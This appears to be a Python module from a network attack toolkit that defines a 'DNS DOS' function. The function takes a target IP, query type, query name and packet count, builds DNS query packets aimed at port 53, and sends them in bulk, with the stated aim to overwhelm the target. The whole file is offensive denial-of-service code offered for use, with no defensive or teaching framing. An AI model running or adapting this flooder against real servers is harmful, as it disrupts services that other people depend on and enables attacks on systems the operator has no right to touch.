from Project import *

req_port = 53
name = "DNS DOS"
function_name = "bind_dos"

def bind_dos(values):
    print("Running DNS DOS attack, please enter the parameters:\n")
    valid_var = ["target_ip", "target_mac_address","query_type", "query_name","quantity"]
    bind_var = ["query_type", "query_name"]
    help_statement = "\nsends a multitude of DOS queries to attempt to overwhelm the target"
    bind = []
    variable_input(valid_var, help_statement, values)
    all_variables_inputted(values, valid_var)
    check_var(values, valid_var)
    template = IP(dst=values.get("target_ip"))/UDP()/DNS(rd=1,qd=DNSQR(qtype=values.get("query_type"),qname=values.get("query_name")))
    pktAmt = int(values.get("quantity"))
    for pktNum in range(0,pktAmt):
        bind.extend(template)
        bind[pktNum][UDP].dport = 53
    sendp(bind)
    print("Packets sent")
